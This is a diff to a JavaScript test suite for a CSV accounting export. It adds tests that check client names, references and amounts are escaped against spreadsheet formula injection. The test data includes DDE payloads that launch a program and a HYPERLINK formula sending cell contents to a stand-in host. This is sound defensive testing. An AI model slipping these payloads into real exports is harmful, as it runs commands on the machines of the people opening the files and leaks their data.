@@ -111,6 +111,57 @@ describe('buildAccountingCsv', () => {
     expect(csv.split('\n')[1]).not.toContain('"');
   });
 
+  describe('spreadsheet-formula injection through the free-text columns', () => {
+    // `client` is the one column carrying text nobody in this codebase constrains — a customer types
+    // their own client's name. A name beginning `=`, `+`, `-` or `@` is a FORMULA to every
+    // spreadsheet, executed the moment the accountant opens the file. Asserted on the emitted LINE,
+    // the actual bytes that leave, never on whether an escaper was called.
+    it.each([
+      ['=', "=cmd|' /C calc'!A0"],
+      ['+', "+cmd|' /C calc'!A0"],
+      ['-', "-2+3+cmd|' /C calc'!A0"],
+      ['@', "@SUM(1+1)*cmd|' /C calc'!A0"],
+    ])('a client name beginning "%s" is defused before it reaches the accountant', (_lead, name) => {
+      const line = buildAccountingCsv([invoiceRow({ client: name })]).split('\n')[1];
+      expect(line).toContain(`,'${name},`);
+      // The payload must never sit at the start of its own cell, quoted or bare: a spreadsheet
+      // strips CSV quotes off before parsing a cell, so quoting alone defuses nothing.
+      expect(line).not.toContain(`,${name},`);
+      expect(line).not.toContain(`,"${name}"`);
+    });
+
+    it('a DDE/HYPERLINK payload carrying its own commas and quotes is guarded AND still valid CSV', () => {
+      const csv = buildAccountingCsv([
+        invoiceRow({ client: '=HYPERLINK("https://evil.invalid?x="&A1,"invoice")' }),
+      ]);
+      expect(csv.split('\n')[1]).toBe(
+        'invoice,INV-2026-0001,2026-03-01,' +
+          '"\'=HYPERLINK(""https://evil.invalid?x=""&A1,""invoice"")"' +
+          ',EUR,100.00,20.00,120.00,,,outstanding',
+      );
+    });
+
+    it('a reference beginning with a trigger is defused too — no column is trusted', () => {
+      const line = buildAccountingCsv([invoiceRow({ reference: '@INV-1' })]).split('\n')[1];
+      expect(line).toBe("invoice,'@INV-1,2026-03-01,Acme Corp,EUR,100.00,20.00,120.00,,,outstanding");
+    });
+
+    it('a NEGATIVE amount still reads as a number — the escape must not break the accounting import', () => {
+      // `-` is both a formula trigger and the first character of every credit line an accounting
+      // ledger legitimately carries. An apostrophe here would hand the importing software text
+      // where it expects a number, which is worse than the hole.
+      const line = buildAccountingCsv([
+        invoiceRow({ net: '-100.00', vat: '-20.00', gross: '-120.00' }),
+      ]).split('\n')[1];
+      expect(line).toBe(
+        'invoice,INV-2026-0001,2026-03-01,Acme Corp,EUR,-100.00,-20.00,-120.00,,,outstanding',
+      );
+      expect(line).not.toContain("'-");
+      // …and it parses back as a number, which is the property that actually matters downstream.
+      expect(Number(line.split(',')[7])).toBe(-120);
+    });
+  });
+
   it('a mixed invoice/credit-note/payment set fills exactly the documented columns per type', () => {
     const csv = buildAccountingCsv([invoiceRow(), creditNoteRow(), paymentRow()]);
     const [, invoiceLine, creditLine, paymentLine] = csv.split('\n');
